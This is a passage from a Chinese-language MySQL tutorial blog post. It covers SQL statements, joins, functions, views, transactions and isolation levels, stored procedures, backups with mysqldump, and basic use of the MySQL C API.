mysql&gt; <span class="keyword">DELETE</span> <span class="keyword">FROM</span> Books2;
mysql&gt; TRUNCATE Books2;
</code></pre><h3 id="更新">更新</h3><p><code>UPDATE</code>用于变更选中行的列值。</p>
<p>mysql&gt; UPDATE Books SET Author=’Lev Nikolayevich Tolstoy’<br>    -&gt; WHERE Id=1;</p>
<h2 id="SELECT语句">SELECT语句</h2><h3 id="获取数据">获取数据</h3><p>选择所有内容</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars;
</code></pre><p>选择特定的列</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Cost <span class="keyword">FROM</span> Cars;
</code></pre><p>可以重命名列名：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, Cost <span class="keyword">AS</span> Price <span class="keyword">FROM</span> Cars;
</code></pre><p>限制输出个数：</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> * <span class="keyword">FROM</span> Cars LIMIT <span class="number">4</span>;
mysql&gt; <span class="built_in">SELECT</span> * <span class="keyword">FROM</span> Cars LIMIT <span class="number">2</span>, <span class="number">4</span>;
mysql&gt; <span class="built_in">SELECT</span> * <span class="keyword">FROM</span> Cars LIMIT <span class="number">4</span> OFFSET <span class="number">2</span>;  <span class="preprocessor"># 同上</span>
</code></pre><h3 id="排序数据">排序数据</h3><p>以降序(<code>DESC</code>)或升序(<code>ASC</code>)排序：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, Cost <span class="keyword">FROM</span> Cars <span class="keyword">ORDER</span> <span class="keyword">BY</span> Cost <span class="keyword">DESC</span>;
</code></pre><h3 id="WHERE">WHERE</h3><p>WHERE语句就像个过滤器：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Orders <span class="keyword">WHERE</span> Customer=<span class="string">"Smith"</span>;
mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Orders <span class="keyword">WHERE</span> Customer <span class="keyword">LIKE</span> <span class="string">"B%"</span>;
</code></pre><h3 id="移除重复项">移除重复项</h3><p><code>DISTINCT</code>从结果中选择唯一的结果集。</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Customer <span class="keyword">FROM</span> Orders <span class="keyword">WHERE</span> Customer <span class="keyword">LIKE</span> <span class="comment">'B%';</span>
</code></pre><p><code>COUNT</code>函数统计个数</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> COUNT(Customer) <span class="keyword">AS</span> <span class="string">"Orders by Brown"</span> <span class="keyword">FROM</span> Orders <span class="keyword">WHERE</span> Customer=<span class="string">"Brown"</span>;
</code></pre><h2 id="聚合数据">聚合数据</h2><p><code>GROUP BY</code>语句被用来结合值一样的数据库记录到一个单一的记录中。通常和聚合函数一起使用。</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> SUM(OrderPrice) <span class="keyword">AS</span> Total, Customer <span class="keyword">FROM</span> Orders <span class="keyword">GROUP</span> <span class="keyword">BY</span> Customer;
</code></pre><p>使用聚合函数时不能使用<code>WHERE</code>而是使用<code>HAVING</code>：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> <span class="keyword">SUM</span>(OrderPrice) AS Total, Customer FROM Orders
    <span class="subst">-&gt; </span><span class="keyword">GROUP</span> <span class="keyword">BY</span> Customer HAVING <span class="keyword">SUM</span>(OrderPrice)&gt;<span class="number">1000</span>;
</code></pre><h3 id="选择内容到文件">选择内容到文件</h3><p><code>SELECT</code>语句能被用来写入表到文件中：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">INTO</span> OUTFILE <span class="string">'/tmp/cars.txt'</span>
    <span class="subst">-&gt; </span>FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">','</span>
    <span class="subst">-&gt; </span>LINES TERMINATED <span class="keyword">BY</span> <span class="string">'\n'</span>
    <span class="subst">-&gt; </span>FROM Cars;
</code></pre><h2 id="子查询">子查询</h2><p>又称嵌套查询，可以和<code>INSERT</code>、<code>SELECT</code>、<code>UPDATE</code>和<code>DELETE</code>配合使用：</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> Cars2 <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars;
mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Customers <span class="keyword">WHERE</span> 
-&gt; CustomerId=(<span class="keyword">SELECT</span> CustomerId <span class="keyword">FROM</span> Reservations <span class="keyword">WHERE</span> Id=<span class="number">5</span>);
mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Customers <span class="keyword">WHERE</span> CustomerId <span class="keyword">IN</span>    
-&gt; (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> CustomerId <span class="keyword">FROM</span> Reservations);
mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Cost &lt;
-&gt; (<span class="keyword">SELECT</span> AVG(Cost) <span class="keyword">FROM</span> Cars);
</code></pre><p><code>EXISTS</code>和<code>NOT EXISTS</code>：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Customers <span class="keyword">WHERE</span> EXISTS
-&gt; (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Reservations <span class="keyword">WHERE</span>
-&gt; Customers.CustomerId=Reservations.CustomerId);
mysql&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Customers <span class="keyword">WHERE</span> <span class="keyword">NOT</span> EXISTS    
-&gt; (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Reservations <span class="keyword">WHERE</span> 
-&gt; Customers.CustomerId=Reservations.CustomerId);
</code></pre><h2 id="限制">限制</h2><p>限制用来限定列的类型。</p>
<p><code>NOT NULL</code>：</p>
<pre><code>mysql&gt; CREATE TABLE People(Id <span class="built_in">INTEGER</span>, LastName <span class="keyword">TEXT</span> <span class="keyword">NOT</span> NULL,
-&gt;                     FirstName <span class="keyword">TEXT</span> <span class="keyword">NOT</span> NULL, City VARCHAR(<span class="number">55</span>));
</code></pre><p><code>UNIQUE</code>：</p>
<pre><code>mysql&gt; CREATE TABLE Brands<span class="list">(<span class="keyword">Id</span> INTEGER, BrandName VARCHAR<span class="list">(<span class="number">30</span>)</span> UNIQUE)</span><span class="comment">;</span>
</code></pre><p><code>PRIMARY KEY</code>自动拥有<code>UNIQUE</code>和<code>NOT NULL</code>：</p>
<pre><code>mysql&gt; CREATE TABLE Brands<span class="list">(<span class="keyword">Id</span> INTEGER PRIMARY KEY, BrandName VARCHAR<span class="list">(<span class="number">30</span>)</span> UNIQUE)</span><span class="comment">;</span>
</code></pre><p><code>FOREIGN KEY</code>是指向另一个表主键的索引，用来联系两个表：</p>
<pre><code>mysql&gt; CREATE TABLE Books<span class="list">(<span class="keyword">BookId</span> INTEGER PRIMARY KEY, Title VARCHAR<span class="list">(<span class="number">50</span>)</span>,
    -&gt; AuthorId INTEGER, FOREIGN KEY<span class="list">(<span class="keyword">AuthorId</span>)</span> REFERENCES Authors<span class="list">(<span class="keyword">AuthorId</span>)</span>)</span>
    -&gt; type=InnoDB<span class="comment">;</span>
</code></pre><p><code>ENUM</code>可以是列出中的一个：</p>
<pre><code>mysql&gt; CREATE TABLE Shops<span class="list">(<span class="keyword">Id</span> INTEGER, Name VARCHAR<span class="list">(<span class="number">55</span>)</span>, 
    -&gt; Quality ENUM<span class="list">(<span class="quoted">'High</span>', <span class="quoted">'Average</span>', <span class="quoted">'Low</span>')</span>)</span><span class="comment">;</span>
</code></pre><p><code>SET</code>可以是零个或多个：</p>
<pre><code>mysql&gt; CREATE TABLE Students<span class="list">(<span class="keyword">Id</span> INTEGER, Name VARCHAR<span class="list">(<span class="number">55</span>)</span>, 
    -&gt; Certificates SET<span class="list">(<span class="quoted">'A1</span>', <span class="quoted">'A2</span>', <span class="quoted">'B1</span>', <span class="quoted">'C1</span>')</span>)</span><span class="comment">; </span>
</code></pre><p>注意插入时<code>Certificates</code>列的值用括号括起来，之间用逗号分隔且不能有空格。</p>
<pre><code>mysql&gt; INSERT INTO <span class="function">Students <span class="title">VALUES</span><span class="params">(<span class="number">3</span>, <span class="string">'Mark'</span>, <span class="string">'A1,A2,D1,D2'</span>)</span></span>;
</code></pre><h2 id="导出和导入数据">导出和导入数据</h2><p>简单导出到文件和导入到数据库：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">INTO</span> OUTFILE <span class="comment">'/tmp/cars';  # 空格分隔</span>
mysql&gt; LOAD DATA INFILE <span class="comment">'/tmp/cars.csv' INTO TABLE Cars</span>
-&gt; FIELDS TERMINATED <span class="keyword">BY</span> <span class="comment">',';</span>
</code></pre><p>导入到xml文件：</p>
<pre><code>$ mysql -uroot -p --<span class="keyword">xml</span> <span class="title">-e</span> 'SELECT * FROM mydb.Cars' &gt; /tmp/cars.<span class="keyword">xml</span>
<span class="title">mysql</span>&gt; LOAD <span class="keyword">XML</span> <span class="title">/tmp</span>/cars.<span class="keyword">xml</span> <span class="title">INTO</span> TABLE Cars;
</code></pre><p>使用mysqldump工具：</p>
<p>只保存数据结构：</p>
<pre><code>$ mysqldump -<span class="keyword">u</span> root -p --<span class="keyword">no</span>-data mydb &gt; bkp1.sql
</code></pre><p>只保存数据</p>
<pre><code>$ mysqldump -uroot -<span class="tag">p</span> --no-create-info mydb &gt; bkp2.sql
</code></pre><p>完整数据库</p>
<pre><code>$ mysqldump -uroot -<span class="tag">p</span> mydb &gt; bkp3.sql
</code></pre><p>恢复数据：</p>
<pre><code>mysql&gt; CREATE DATABASE mydb<span class="comment">;</span>
mysql&gt; USE mydb<span class="comment">;</span>
mysql&gt; source bkp3.sql
</code></pre><h2 id="连接表">连接表</h2><h3 id="内连接">内连接</h3><p>分<code>INNER JOIN</code>、<code>NATURAL INNER JOIN</code>和<code>CROSS INNER JOIN</code>三种， <code>INNER</code>关键字可省略。以下是<code>INNER JOIN</code></p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, Day <span class="keyword">FROM</span> Customers <span class="keyword">AS</span> C <span class="keyword">JOIN</span> Reservations 
    -&gt; <span class="keyword">AS</span> R <span class="keyword">ON</span> C.CustomerId=R.CustomerId;
mysql&gt; <span class="keyword">SELECT</span> Name, Day <span class="keyword">FROM</span> Customers, Reservations
    -&gt; <span class="keyword">WHERE</span> Customers.CustomerId=Reservations.CustomerId;
</code></pre><p><code>CROSS JOIN</code>是两个表的笛卡尔乘积。</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers CROSS <span class="built_in">JOIN</span> Reservations;
mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers, Reservations;
</code></pre><h3 id="外连接">外连接</h3><p>左内连，选取左边所有的值：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> Name, <span class="built_in">Day</span> FROM Customers <span class="built_in">LEFT</span> <span class="built_in">JOIN</span> Reservations
    -&gt; <span class="keyword">ON</span> Customers.CustomerId=Reservations.CustomerId;
mysql&gt; <span class="keyword">SELECT</span> Name, <span class="built_in">Day</span> FROM Customers <span class="built_in">LEFT</span> <span class="built_in">JOIN</span> Reservations
    -&gt; USING (CustomerId);
</code></pre><p>右内连，同上，孤单的右边值对应的左边为<code>NULL</code></p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers RIGHT <span class="built_in">JOIN</span>
    -&gt; Reservations USING (CustomerId);
</code></pre><p>自然连，会把所有列连在一起：</p>
<pre><code>mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers NATURAL <span class="built_in">JOIN</span> Reservations;
mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers 
    -&gt; NATURAL LEFT <span class="built_in">JOIN</span> Reservations;
mysql&gt; <span class="built_in">SELECT</span> <span class="built_in">Name</span>, Day <span class="keyword">FROM</span> Customers
    -&gt; NATURAL RIGHT <span class="built_in">JOIN</span> Reservations;
</code></pre><h2 id="MySQL函数">MySQL函数</h2><h3 id="数学函数">数学函数</h3><pre><code>mysql&gt; <span class="tag">SELECT</span> <span class="function">RAND</span>(), <span class="function">ABS</span>(-3), <span class="function">PI</span>(), <span class="function">SIN</span>(0<span class="class">.5</span>),
     &gt; <span class="function">BIN</span>(22), <span class="function">OCT</span>(22), <span class="function">HEX</span>(22)
     &gt; <span class="function">CEIL</span>(11<span class="class">.256</span>), <span class="function">FLOOR</span>(11<span class="class">.256</span>), <span class="function">ROUND</span>(11<span class="class">.256</span>, 2),
     &gt; <span class="function">POW</span>(3, 3), <span class="function">SQRT</span>(9),
     &gt; <span class="function">DEGREES</span>(2*<span class="function">PI</span>());
</code></pre><h3 id="聚合函数">聚合函数</h3><pre><code>mysql&gt; SELECT MIN<span class="function"><span class="params">(Cost)</span>, <span class="title">MAX</span><span class="params">(Cost)</span>, <span class="title">AVG</span><span class="params">(Cost)</span>
    -&gt;</span> FROM Cars;
mysql&gt; SELECT SUM(Cost), COUNT(Id), STD(Cost),<span class="function"> 
    -&gt;</span> VARIANCE(Cost) FROM Cars;
</code></pre><h3 id="字符串函数">字符串函数</h3><pre><code>mysql&gt; <span class="keyword">SELECT</span> LENGTH(<span class="string">'ZetCode'</span>), UPPER(<span class="string">'ZetCode'</span>), LOWER(<span class="string">'ZetCode'</span>);
mysql&gt; <span class="keyword">SELECT</span> LPAD(RPAD(<span class="string">"ZetCode"</span>, <span class="number">10</span>, <span class="string">"*"</span>), <span class="number">13</span>, <span class="string">"*"</span>);
mysql&gt; <span class="keyword">SELECT</span> REVERSE(<span class="string">'ZetCode'</span>), REPEAT(<span class="string">'*'</span>, <span class="number">6</span>);
mysql&gt; <span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="string">'ZetCode'</span>, <span class="number">3</span>), <span class="keyword">RIGHT</span>(<span class="string">'ZetCode'</span>, <span class="number">3</span>), 
    -&gt; SUBSTRING(<span class="string">'ZetCode'</span>, <span class="number">3</span>, <span class="number">3</span>);
mysql&gt; <span class="keyword">SELECT</span> STRCMP(<span class="string">'byte'</span>, <span class="string">'byte'</span>), CONCAT(<span class="string">'three'</span>, <span class="string">' apples'</span>);
mysql&gt; <span class="keyword">SELECT</span> REPLACE(<span class="string">'basketball'</span>, <span class="string">'basket'</span>, <span class="string">'foot'</span>);
</code></pre><h3 id="日期时间函数">日期时间函数</h3><pre><code>mysql&gt; <span class="keyword">SELECT</span> <span class="keyword">DAYNAME</span>(<span class="string">'2011-01-23'</span>), <span class="keyword">YEAR</span>(<span class="string">'2011/01/23'</span>),
    -&gt; <span class="keyword">MONTHNAME</span>(<span class="string">'110123'</span>);
mysql&gt; <span class="keyword">SELECT</span> NOW();
mysql&gt; <span class="keyword">SELECT</span> CURTIME(), CURDATE();
mysql&gt; <span class="keyword">SELECT</span> DATEDIFF(<span class="string">'2011-3-12'</span>, <span class="string">'2011-1-12'</span>);
mysql&gt; <span class="keyword">SELECT</span> WEEKOFYEAR(<span class="string">'110123'</span>), <span class="keyword">WEEKDAY</span>(<span class="string">'110123'</span>),
    -&gt; QUARTER(<span class="string">'110123'</span>);
mysql&gt; <span class="keyword">SELECT</span> DATE_FORMAT(<span class="string">'110123'</span>, <span class="string">'%d-%m-%Y'</span>);
mysql&gt; <span class="keyword">SELECT</span> DATE_ADD(<span class="string">'110123'</span>, INTERVAL <span class="number">45</span> <span class="keyword">DAY</span>), 
    -&gt; SUBDATE(<span class="string">'110309'</span>, INTERVAL <span class="number">45</span> <span class="keyword">DAY</span>);
</code></pre><h3 id="系统函数">系统函数</h3><pre><code>mysql&gt; <span class="keyword">SELECT</span> VERSION(), DATABASE()<span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> USER()<span class="comment">;</span>
mysql&gt; <span class="keyword">SELECT</span> CHARSET(<span class="string">'ZetCode'</span>), COLLATION(<span class="string">'ZetCode'</span>)<span class="comment">;</span>
</code></pre><h2 id="MySQL视图">MySQL视图</h2><p>视图是一种从表中切取的特殊伪表。有以下限制：</p>
<ul>
<li><code>SELECT</code>不能包含子查询</li>
<li><code>SELECT</code>语句不能指向系统或用户变量</li>
<li>在定义中指向的任何表或视图必须存在</li>
<li>不能创建临时视图</li>
<li>一个视图不能被触发关联。</li>
</ul>
<p>创建、更改和删除视图：</p>
<pre><code>mysql&gt; CREATE VIEW CheapCars <span class="keyword">AS</span> 
    -&gt; <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Cost&lt;<span class="number">25000</span>;
mysql&gt; ALTER VIEW CheapCars <span class="keyword">AS</span> <span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Cars
    -&gt; <span class="keyword">WHERE</span> Cost&lt;<span class="number">30000</span>;
mysql&gt; DROP VIEW CheapCars;
</code></pre><p>找到视图：</p>
<pre><code>mysql&gt; SHOW FULL TABLES;
mysql&gt; <span class="keyword">SELECT</span> TABLE_NAME, TABLE_TYPE <span class="keyword">FROM</span> information_schema.TABLES;
mysql&gt; <span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> information_schema.VIEWS;
</code></pre><p><code>UNION</code>被用来结合两个或更多<code>SELECT</code>语句得到的结果集，可以通过<code>UNION</code>创建视图</p>
<pre><code>mysql&gt; CREATE VIEW FavoriteCars <span class="keyword">AS</span>
    -&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Id=<span class="number">7</span>
    -&gt; UNION <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Id=<span class="number">4</span>
    -&gt; UNION <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Cars <span class="keyword">WHERE</span> Id=<span class="number">5</span>;
</code></pre><h2 id="事务">事务</h2><p>数据库并发操作控制单位。这些操作可以commit可以回滚。</p>
<p>解释下ACID。</p>
<h3 id="隔离级">隔离级</h3><ul>
<li>序列，一个接一个</li>
<li>重复读，读的时候其它事务没提交就没法修改，改的时候没提交其它事务就没法读，默认级别。</li>
<li>读提交。</li>
<li>读未提交。</li>
</ul>
<ol>
<li>脏读(事务没提交，提前读取)：脏读就是指当一个事务正在访问数据，并且对数据进行了修改，而这种修改还没有提交到数据库中，这时，另外一个事务也访问这个数据，然后使用了这个数据。 </li>
<li>不可重复读(两次读的不一致) ：是指在一个事务内，多次读同一数据。在这个事务还没有结束时，另外一个事务也访问该同一数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改，那么第一个事务两次读到的的数据可能是不一样的。这样就发生了在一个事务内两次读到的数据是不一样的，因此称为是不可重复读。例如，一个编辑人员两次读取同一文档，但在两次读取之间，作者重写了该文档。当编辑人员第二次读取文档时，文档已更改。原始读取不可重复。如果只有在作者全部完成编写后编辑人员才可以读取文档，则可以避免该问。</li>
<li>幻读 : 是指当事务不是独立执行时发生的一种现象，例如第一个事务对一个表中的数据进行了修改，这种修改涉及到表中的全部数据行。同时，第二个事务也修改这个表中的数据，这种修改是向表中插入一行新数据。那么，以后就会发生操作第一个事务的用户发现表中还有没有修改的数据行，就好象发生了幻觉一样。例如，一个编辑人员更改作者提交的文档，但当生产部门将其更改内容合并到该文档的主复本时，发现作者已将未编辑的新材料添加到该文档中。如果在编辑人员和生产部门完成对原始文档的处理之前，任何人都不能将新材料添加到文档中，则可以避免该问题。 </li>
</ol>
<p>默认隔离级和可能出现情况：</p>
<table>
<thead>
<tr>
<th>隔离级别</th>
<th>Phantom read</th>
<th>Nonrepeatable read</th>
<th>Dirty read</th>
</tr>
</thead>
<tbody>
<tr>
<td>序列化</td>
<td>不可能</td>
<td>不可能</td>
<td>不可能</td>
</tr>
<tr>
<td>可重读</td>
<td>可能</td>
<td>不可能</td>
<td>不可能</td>
</tr>
<tr>
<td>读提交</td>
<td>可能</td>
<td>可能</td>
<td>不可能</td>
</tr>
<tr>
<td>读未提交</td>
<td>可能</td>
<td>可能</td>
<td>可能</td>
</tr>
</tbody>
</table>
<p>查看和选择隔离级别</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> @<span class="constant">@tx_isolation</span><span class="comment">;</span>
mysql&gt; SET TRANSACTION ISOLATION LEVEL SERIALIZABLE<span class="comment">;</span>
</code></pre><h3 id="自动提交">自动提交</h3><p>MySQL会自动提交不以<code>START</code>开头的<code>UPDATE</code>和<code>INSERT</code>语句。查看和设置当前设置：</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> @<span class="constant">@autocommit</span><span class="comment">;</span>
mysql&gt; SET autocommit=<span class="number">0</span><span class="comment">;</span>
</code></pre><p>提交后的状态无法回滚。<code>ROLLBACK</code></p>
<h3 id="开始事务">开始事务</h3><p>自动提交的命令会被MySQL封装为一个单独的事务。我们也可以用<code>START</code>语句实现。</p>
<pre><code>mysql&gt; <span class="literal">START</span> TRANSACTION;
</code></pre><p>之后可以执行命令提交或者回滚：</p>
<p>提交</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> <span class="keyword">Test</span> VALUES (<span class="number">5</span>), (<span class="number">6</span>)<span class="comment">;</span>
mysql&gt; INSERT <span class="keyword">INTO</span> <span class="keyword">Test</span> VALUES (<span class="number">7</span>), (<span class="number">8</span>)<span class="comment">;</span>
mysql&gt; COMMIT<span class="comment">;</span>
</code></pre><p>回滚</p>
<pre><code>mysql&gt; INSERT <span class="keyword">INTO</span> <span class="keyword">Test</span> VALUES (<span class="number">5</span>), (<span class="number">6</span>)<span class="comment">;</span>
mysql&gt; INSERT <span class="keyword">INTO</span> <span class="keyword">Test</span> VALUES (<span class="number">7</span>), (<span class="number">8</span>)<span class="comment">;</span>
mysql&gt; ROLLBACK<span class="comment">;</span>
</code></pre><h2 id="在MySQL中存储例程">在MySQL中存储例程</h2><p>在MySQL中存在两种存储例程，一种是过程，一种是函数。</p>
<p>过程用<code>CALL</code>调用，不返回值。函数通过<code>SELECT</code>使用，返回值。</p>
<p>过程存储有利有弊。</p>
<h3 id="一个简单过程">一个简单过程</h3><p>创建<code>AllCars</code>g过程选取<code>Cars</code>表中所有内容：</p>
<pre><code>mysql&gt; <span class="keyword">CREATE</span> <span class="function"><span class="keyword">PROCEDURE</span> <span class="title">AllCars</span><span class="params">()</span> <span class="title">SELECT</span> * <span class="title">FROM</span> <span class="title">Cars</span>;</span>
mysql&gt; CALL AllCars();
</code></pre><h3 id="一个简单函数">一个简单函数</h3><p>定义过程和函数最好的方法是一个单独的sql文件。以下是创建了一个<code>sql</code>文件。通过<code>CREATE FUNCTION</code>创建函数，通过<code>SELECT</code>语句调用。</p>
<pre><code><span class="comment">-- this function computes the area</span>
<span class="comment">-- of a circle; it takes a radius as</span>
<span class="comment">-- a parameter</span>

DELIMITER $$

<span class="operator"><span class="keyword">DROP</span> <span class="keyword">FUNCTION</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> CircleArea;</span>

<span class="operator"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> CircleArea(r <span class="keyword">DOUBLE</span>) <span class="keyword">RETURNS</span> <span class="keyword">DOUBLE</span>
<span class="keyword">BEGIN</span>
    <span class="keyword">DECLARE</span> area <span class="keyword">DOUBLE</span>;</span>

    <span class="operator"><span class="keyword">SET</span> area = r * r * <span class="keyword">pi</span>();</span>
    RETURN area;
<span class="operator"><span class="keyword">END</span> 

$$

DELIMITER ;</span>
</code></pre><p>函数调用：</p>
<pre><code>mysql&gt; source circlearea.sql
mysql&gt; <span class="function">SELECT <span class="title">CircleArea</span><span class="params">(<span class="number">5.5</span>)</span></span>;
</code></pre><h3 id="过程参数">过程参数</h3><p>有三种参数内型：</p>
<ul>
<li>IN，传递给过程，只能在函数内修改</li>
<li>OUT，输出参数，并不从外部传递给过程</li>
<li>INOUT，混合内型，可以传递给过程来更改也可以在过程外部存取。</li>
</ul>
<p>在sql文件中定义过程：</p>
<pre><code>-- this <span class="function"><span class="keyword">procedure</span> <span class="title">computes</span> <span class="title">the</span> <span class="title">power</span> 
-- <span class="title">of</span> <span class="title">a</span> <span class="title">given</span> <span class="title">value</span>

<span class="title">DELIMITER</span> $$

<span class="title">DROP</span> <span class="title">PROCEDURE</span> <span class="title">IF</span> <span class="title">EXISTS</span> <span class="title">Pow</span>;</span>

<span class="keyword">CREATE</span> <span class="function"><span class="keyword">PROCEDURE</span> <span class="title">Pow</span><span class="params">(<span class="keyword">IN</span> val DOUBLE, <span class="keyword">OUT</span> p DOUBLE)</span> 
<span class="title">BEGIN</span>
    <span class="title">SET</span> <span class="title">p</span> = <span class="title">val</span> * <span class="title">val</span>;</span>
<span class="keyword">END</span> 

$$

DELIMITER ;
</code></pre><p>调用：</p>
<pre><code>mysql&gt; source power.sql

mysql&gt; <span class="built_in">CALL</span> Pow(<span class="number">3</span>, <span class="constant">@p</span>)<span class="comment">;</span>

mysql&gt; <span class="keyword">SELECT</span> <span class="constant">@p</span><span class="comment">;</span>
</code></pre><h3 id="找到过程或函数">找到过程或函数</h3><p>通过<code>SHOW PROCEDURE STATUS</code>和<code>SHOW FUNCTION STATUS</code>查看。</p>
<p>或者</p>
<pre><code>mysql&gt; <span class="keyword">SELECT</span> SPECIFIC_NAME from information_schema<span class="built_in">.</span>ROUTINES  
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> ROUTINE_TYPE=<span class="string">'PROCEDURE'</span>;
mysql&gt; <span class="keyword">SELECT</span> SPECIFIC_NAME from information_schema<span class="built_in">.</span>ROUTINES 
    <span class="subst">-&gt; </span><span class="keyword">WHERE</span> ROUTINE_TYPE=<span class="string">'FUNCTION'</span>;
</code></pre><h2 id="MySQL_C_API">MySQL C API</h2><p>MySQL有个C API</p>
<p>debian上要装这个：</p>
<pre><code>$ sudo apt-<span class="built_in">get</span> install libmysqlclient-<span class="built_in">dev</span>
</code></pre><p>我们只要在头文件中包含<code>mysql.h</code>，编译时以以下方式编译：</p>
<pre><code>$ gcc <span class="property">version</span>.c -o <span class="property">version</span>  `mysql_config <span class="comment">--cflags --libs`</span>
</code></pre><p>基本步骤是先初始化连接：</p>
<pre><code>MYSQL *con = mysql_init(<span class="literal">NULL</span>);

<span class="keyword">if</span> (con == <span class="literal">NULL</span>) 
{
    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, mysql_error(con));
    <span class="built_in">exit</span>(<span class="number">1</span>);
}
</code></pre><p>再真的连到服务器或某个数据库中：</p>
<pre><code><span class="keyword">if</span> (mysql_real_connect(con, <span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root_pswd"</span>, 
        <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>) == <span class="literal">NULL</span>) 
{
    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, mysql_error(con));
    mysql_close(con);
    <span class="built_in">exit</span>(<span class="number">1</span>);
}
</code></pre><p>执行操作：</p>
<pre><code><span class="keyword">if</span> (mysql_query(con, <span class="string">"CREATE DATABASE testdb"</span>)) 
{
    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, mysql_error(con));
    mysql_close(con);
    <span class="built_in">exit</span>(<span class="number">1</span>);
}
</code></pre><p>取回数据：</p>
<pre><code><span class="type">MYSQL_RES</span> *<span class="literal">result</span> = mysql_store_result(con);

<span class="keyword">if</span> (<span class="literal">result</span> == <span class="type">NULL</span>) 
{
    finish_with_error(con);
}

<span class="type">int</span> num_fields = mysql_num_fields(<span class="literal">result</span>);

<span class="type">MYSQL_ROW</span> row;

<span class="keyword">while</span> ((row = mysql_fetch_row(<span class="literal">result</span>))) 
{ 
    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_fields; i++) 
    { 
        printf(<span class="string">"%s "</span>, row[i] ? row[i] : <span class="string">"NULL"</span>); 
    } 
        printf(<span class="string">"\n"</span>); 
}

mysql_free_result(<span class="literal">result</span>);
</code></pre><p>还有些其它函数，参考<a href="http://dev.mysql.com/doc/refman/5.1/zh/apis.html" target="_blank" rel="external">http://dev.mysql.com/doc/refman/5.1/zh/apis.html</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/javascript/2014/05/18/a-glance-at-d3js/" itemprop="url">
                  A Glance at D3.js
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-05-18T00:00:00+08:00" content="2014-05-18">
              2014-05-18
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/javascript/" itemprop="url" rel="index">
                    <span itemprop="name">javascript</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/javascript/2014/05/18/a-glance-at-d3js/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="javascript/2014/05/18/a-glance-at-d3js/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


